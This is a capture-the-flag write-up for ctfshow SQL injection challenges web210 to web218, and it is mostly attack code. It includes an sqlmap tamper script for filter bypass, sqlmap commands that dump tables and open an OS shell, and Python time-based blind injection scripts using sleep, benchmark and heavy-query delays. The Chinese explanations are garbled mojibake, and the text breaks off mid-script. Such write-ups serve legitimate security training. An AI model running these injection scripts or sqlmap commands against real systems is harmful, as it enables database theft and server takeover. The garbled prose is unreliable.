class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>ËøáÊª§‰∫Ü Âú®web210ÁöÑÂü∫Á°Ä‰∏äËøáÊª§‰∫ÜÁ©∫Ê†º Â∞ÜÁ©∫Ê†ºÊõøÊç¢Êàê%0aÔºå‰ΩÜÊòØ‰πãÂâçËÑöÊú¨‰æùÊóßÂèØ‰ª•</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>Â§öËøáÊª§‰∫Ü<code>*</code>ÔºåPayloadÂêå‰∏ä</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web213-‚Äìos-shell"><a href="#web213-‚Äìos-shell" class="headerlink" title="web213(‚Äìos-shell)"></a>web213(‚Äìos-shell)</h4><p>‰ΩøÁî®ÂàöÊâçÁöÑtamperËÑöÊú¨Â∞±Ë°åÔºå‰ΩÜÊòØÊúÄÂêé‰ΩøÁî®<code>--os-shell</code>ËøõÂÖ•shell‰∫§‰∫íÂ∞±Ë°å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre><h4 id="web214-Êó∂Èó¥Áõ≤Ê≥®"><a href="#web214-Êó∂Èó¥Áõ≤Ê≥®" class="headerlink" title="web214(Êó∂Èó¥Áõ≤Ê≥®)"></a>web214(Êó∂Èó¥Áõ≤Ê≥®)</h4><p>Âà∑Êñ∞È¶ñÈ°µÊäìÂåÖÂæóÂà∞Ê≥®ÂÖ•ÁÇπ(ÊàëÁî®httpsÁöÑÊó∂ÂÄôÊ≤°ÊäìÂà∞ÔºåhttpÂ∞±ÂèØ‰ª•‰∫Ü)</p><p><img src="web214.png" loading="lazy"></p><p>ÁÑ∂ÂêéÂ∞±ÊòØËøõË°åÊó∂Èó¥Áõ≤Ê≥®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagx,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flaga,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>‰ΩøÁî®ÂçïÂºïÂè∑Èó≠ÂêàÔºåÂêéÈù¢‰ΩøÁî®<code>#</code>ÊàñËÄÖÈó≠Âêà</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaa,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre><p>Â∞ÜPayloadËøõË°åbase64ÁºñÁ†ÅÂπ∂Èó≠ÂêàÂç≥ÂèØ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagxcc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>Ë¢´ban‰∫Ü</p><p><a href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sqlÊó∂Èó¥Áõ≤Ê≥®Âè¶Â§ñ‰∏§ÁßçÊñπÂºè(benchmark,heavy query)</a></p><p><strong>benchmark()</strong></p><p>benchmarkÊòØMysqlÁöÑ‰∏Ä‰∏™ÂÜÖÁΩÆÂáΩÊï∞,ÂÖ∂‰ΩúÁî®ÊòØÊù•ÊµãËØï‰∏Ä‰∫õÂáΩÊï∞ÁöÑÊâßË°åÈÄüÂ∫¶„ÄÇbenchmark()‰∏≠Â∏¶Êúâ‰∏§‰∏™ÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÊòØÊâßË°åÁöÑÊ¨°Êï∞ÔºåÁ¨¨‰∫å‰∏™ÊòØË¶ÅÊâßË°åÁöÑÂáΩÊï∞ÊàñËÄÖÊòØË°®ËææÂºè</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));+---------------------------+| BENCHMARK(10000,md5(&#39;a&#39;)) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));+-----------------------------+| BENCHMARK(1000000,md5(&#39;a&#39;)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.33 sec)mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));+------------------------------+| BENCHMARK(10000000,md5(&#39;a&#39;)) |+------------------------------+|                            0 |+------------------------------+1 row in set (2.93 sec)</code></pre><p>ÂèØ‰ª•ÁúãÂà∞,ÊâßË°å‰∏çÂêåÁöÑÊ¨°Êï∞ÈÇ£‰πàÊâßË°åÁöÑÊó∂Èó¥‰πüÂ∞±‰∏ç‰∏ÄÊ†∑ÔºåÈÄöËøáËøô‰∏™ÂáΩÊï∞Êàë‰ª¨ÂèØ‰ª•ËææÂà∞‰∏ésleep()ÂêåÊ†∑ÁöÑÂª∂Êó∂ÁõÆÁöÑ„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagxccb,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h4><p><code>benchmark</code>Ë¢´ban‰∫Ü</p><p>ËøòÊúâ‰∏ÄÁßçÊñπÊ≥ï ‰ΩøÁî®Êü•ËØ¢ËØ≠Âè• Êü•ËØ¢Â§ßÈáèÊï∞ÊçÆ‰ªéËÄåÊ∂àËÄóÊó∂Èó¥</p><p>Êú¨Âú∞ÂÖàÊºîÁ§∫‰∏ÄÊ¨° users‰∏ÄÂÖ±ÂÖ≠Êù°Êï∞ÊçÆ ÊúÄÁªà‰ºöÊúâ36Êù°Êï∞ÊçÆ 6*6&#x3D;36 formÂêé Â¶ÇÊûúÊòØÈÄóÂè∑ ‰ºöËøõË°åÊéíÂàóÁªÑÂêà Â¶ÇÊûúË°®Ë∂≥Â§üÂ§ßÈÇ£‰πàÊü•ËØ¢ÁöÑÊï∞ÊçÆ‰πüÂ∞±Áõ∏</p><p>ÂΩìÂ§ßÔºàÂéüÁêÜ‰∏çÁî®ÁêÜËß£ ËÆ∞‰ΩèËøô‰πàÁî®ËÉΩÊü•ËØ¢Â§ßÈáèÊï∞ÊçÆÂç≥ÂèØÔºâËØ•ÊñπÂºèÂè´Á¨õÂç°Â∞îÁßØ</p><p><img src="web218.png" loading="lazy"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://2ba8df77-69bf-43d4-99e0-b2689ef71af6.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">7</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Â∫ìÂêç</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># Êü•Ë°®Âêç  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•ÂàóÂêç  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) and if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token 